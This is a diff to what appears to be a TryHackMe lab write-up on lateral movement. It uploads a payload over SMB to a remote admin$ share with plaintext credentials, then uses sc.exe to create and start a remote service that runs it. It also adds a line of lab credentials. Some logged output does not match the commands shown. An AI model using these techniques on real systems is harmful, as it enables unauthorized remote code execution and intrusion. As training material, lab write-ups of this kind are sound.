@@ -35,9 +35,9 @@ Saved as: Payload1234.exe
 ```
 
 ```Bash
-root@ip-10-10-43-174:~# smbclient -c 'put Payload1234.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+root@ip-10-10-43-174:~# smbclient -c 'put Payload.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 WARNING: The "syslog" option is deprecated
-putting file Payload.exe as \Payload1234.exe (115.2 kb/s) (average 115.2 kb/s)
+putting file Payload.exe as \Payload.exe (115.2 kb/s) (average 115.2 kb/s)
 ```
 
 ```Bash
@@ -105,13 +105,13 @@ C:\Windows\system32>
 ```
 
 ```shell-session
-C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-Paylaod1234 binPath= "%windir%\Payload1234.exe" start= auto
-sc.exe \\thmiis.za.tryhackme.com create THMservice-Paylaod1234 binPath= "%windir%\Paylaod1234.exe" start= auto
+C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-Payload binPath= "%windir%\Payload.exe" start= auto
+sc.exe \\thmiis.za.tryhackme.com create THMservice-Payload binPath= "%windir%\Payload.exe" start= auto
 [SC] CreateService SUCCESS
 ```
 
 ```shell-session
-C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-Paylaod1234
+C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-Payload
 sc.exe \\thmiis.za.tryhackme.com start THMservice-9999
 
 SERVICE_NAME: THMservice-9999 
@@ -126,6 +126,8 @@ SERVICE_NAME: THMservice-9999
         FLAGS              : 
 
 ```
+
+Username: jenna.field Password: Income1982
 
 ## Moving Laterally Using WMI
 
